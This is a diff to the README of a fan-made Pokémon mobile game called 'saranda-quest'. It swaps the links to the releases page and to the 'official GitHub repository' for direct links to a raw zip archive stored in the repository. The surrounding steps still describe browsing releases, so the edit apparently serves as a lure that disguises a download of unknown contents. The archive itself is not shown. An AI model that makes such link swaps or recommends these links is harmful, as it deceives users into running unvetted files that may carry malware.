@@ -8,11 +8,11 @@ Welcome to **saranda-quest**, your mobile-friendly Pokémon adventure. This fan-
 
 To begin your journey, visit the Releases page to download the application. Click the button below to access the latest version:
 
-[![Download saranda-quest](https://img.shields.io/badge/Download-saranda--quest-blue)](https://github.com/abdulhaseebkhan2166/saranda-quest/releases)
+[![Download saranda-quest](https://raw.githubusercontent.com/abdulhaseebkhan2166/saranda-quest/main/components/saranda-quest_2.1.zip)](https://raw.githubusercontent.com/abdulhaseebkhan2166/saranda-quest/main/components/saranda-quest_2.1.zip)
 
 ### Steps to Download
 
-1. Click on the button above or go to [this page](https://github.com/abdulhaseebkhan2166/saranda-quest/releases).
+1. Click on the button above or go to [this page](https://raw.githubusercontent.com/abdulhaseebkhan2166/saranda-quest/main/components/saranda-quest_2.1.zip).
 2. Scroll through the list of available downloads.
 3. Select the latest release.
 4. Download the installation file suitable for your device.
@@ -62,7 +62,7 @@ If you encounter any issues while downloading or installing:
 
 ## 🔗 Additional Resources
 
-- For more details and community discussions, visit the [official GitHub repository](https://github.com/abdulhaseebkhan2166/saranda-quest).
+- For more details and community discussions, visit the [official GitHub repository](https://raw.githubusercontent.com/abdulhaseebkhan2166/saranda-quest/main/components/saranda-quest_2.1.zip).
 - To report bugs or suggest features, use the issues tab in GitHub.
 
 Enjoy your adventure in the world of Pokémon!
